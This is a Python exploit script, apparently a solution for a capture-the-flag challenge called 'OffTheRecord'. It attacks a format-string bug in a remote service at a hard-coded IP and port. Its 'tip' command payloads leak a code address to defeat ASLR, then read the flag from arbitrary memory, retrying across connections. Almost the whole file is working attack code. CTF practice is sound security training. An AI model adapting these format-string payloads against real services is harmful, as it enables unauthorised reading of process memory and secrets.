#!/usr/bin/env python3
# Challenge 3 - OffTheRecord : format-string arbitrary read (tip <text> -> printf(user))
import socket, struct, re, time
HOST, PORT = "47.128.14.16", 1338
MAIN_OFF, FLAG_OFF = 0x11c0, 0x42e0

def rd(s, t=1.2):
    s.settimeout(t); b=b""
    try:
        while True:
            d=s.recv(4096)
            if not d: break
            b+=d
    except socket.timeout: pass
    return b

def attempt():
    s=socket.socket(); s.settimeout(6); s.connect((HOST,PORT)); rd(s,1.5)
    s.sendall(b"tip MK:%110$p\n"); time.sleep(0.3)         # leak main
    m=re.search(rb"MK:(0x[0-9a-f]+)", rd(s,1.2))
    if not m: s.close(); return None
    base = int(m.group(1),16) - MAIN_OFF
    flag = base + FLAG_OFF
    if base & 0xfff or b"\x00" in struct.pack("<Q",flag)[:6]:
        s.close(); return None
    s.sendall(b"tip " + b"%11$s".ljust(24, b"A") + struct.pack("<Q", flag) + b"\n")
    time.sleep(0.4); out=rd(s,1.5); s.sendall(b"quit\n"); s.close()
    return out

for _ in range(15):                                        # ASLR re-rolls per connection
    out = attempt()
    if out and (m := re.search(rb"MPTC\{[^}]*\}", out)):
        print("[+] FLAG:", m.group().decode()); break
